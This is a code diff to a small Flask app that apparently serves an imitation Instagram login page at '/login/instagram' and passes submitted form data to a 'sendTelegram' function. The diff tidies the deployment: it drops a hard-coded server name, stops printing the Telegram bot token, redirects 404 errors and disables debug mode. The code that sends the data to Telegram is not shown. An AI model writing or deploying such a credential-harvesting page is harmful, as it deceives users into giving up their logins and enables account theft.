@@ -5,7 +5,6 @@ import os
 
 load_dotenv()
 app = Flask(__name__)
-app.config['SERVER_NAME'] = 'oauth.s-usm.md'
 
 def sendTelegram(request):
     # Extracting form data
@@ -51,7 +50,7 @@ def sendTelegram(request):
 
 @app.errorhandler(404)
 def error404(e):
-    return print(os.getenv('TELEGRAM_BOT_TOKEN'))
+    return redirect('https://s-usm.md')
 
 @app.route('/login/instagram', methods=['GET', 'POST'])
 def login():
@@ -59,12 +58,11 @@ def login():
         # Process and handle the login data
         sendTelegram(request)
         # Redirect to the login page after POST request
-        return redirect('http://oauth.s-usm.md/login/instagram')
+        return redirect(url_for('login'))
     else:
         # Serve the login page on a GET request
         return render_template('login.html')
 
 if __name__ == '__main__':
     # Running the app on the local development server
-    print(os.getenv('TELEGRAM_BOT_TOKEN'))
-    app.run(debug=True)
+    app.run(debug=False)
